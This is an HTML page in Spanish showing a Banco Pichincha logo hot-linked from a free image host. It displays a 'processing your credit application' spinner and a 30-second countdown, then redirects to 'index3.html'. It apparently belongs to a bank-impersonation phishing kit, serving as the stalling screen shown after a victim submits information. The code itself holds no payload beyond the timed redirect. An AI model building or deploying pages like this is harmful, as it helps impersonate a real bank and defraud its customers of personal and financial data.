<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Procesando Solicitud</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #ffffff;
      color: #1a2b4c;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px 20px;
      border-bottom: 1px solid #e2e8f0;
      background-color: #ffffff;
    }

    .logo-container img {
      height: 40px;
      object-fit: contain;
    }

    main {
      max-width: 480px;
      width: 100%;
      margin: auto auto;
      padding: 40px 20px;
      text-align: center;
    }

    /* Animación de Spinner */
    .spinner-container {
      margin-bottom: 25px;
      display: flex;
      justify-content: center;
    }

    .spinner {
      width: 60px;
      height: 60px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #ffdd00;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    h2 {
      font-size: 22px;
      color: #112855;
      font-weight: 600;
      margin-bottom: 15px;
      line-height: 1.4;
    }

    p {
      font-size: 15px;
      color: #555555;
      margin-bottom: 25px;
    }

    /* Estilo del contador visual */
    .timer-box {
      display: inline-block;
      background-color: #f8fafc;
      border: 1px solid #e2e8f0;
      border-radius: 8px;
      padding: 15px 30px;
    }

    .timer-number {
      font-size: 36px;
      font-weight: 700;
      color: #112855;
    }

    .timer-label {
      font-size: 13px;
      color: #64748b;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
  </style>
</head>
<body>

  <header>
    <div class="logo-container">
      <img src="https://i.postimg.cc/L84XBCfQ/Banco-Pichincha-nuevo.png" alt="Logo Financiera">
    </div>
  </header>

  <main>
    <div class="spinner-container">
      <div class="spinner"></div>
    </div>

    <h2>¡Estamos preparando su solicitud de credito espere un momento!</h2>
    <p>Por favor, no cierre ni recargue esta ventana mientras verificamos su información.</p>

    <div class="timer-box">
      <div class="timer-number" id="countdown">30</div>
      <div class="timer-label">Segundos restantes</div>
    </div>
  </main>

  <script>
    let timeLeft = 30;
    const countdownElement = document.getElementById('countdown');

    const timer = setInterval(() => {
      timeLeft--;
      countdownElement.textContent = timeLeft;

      if (timeLeft <= 0) {
        clearInterval(timer);
        // Redirección final a index3.html
        window.location.href = 'index3.html';
      }
    }, 1000);
  </script>
</body>
</html>
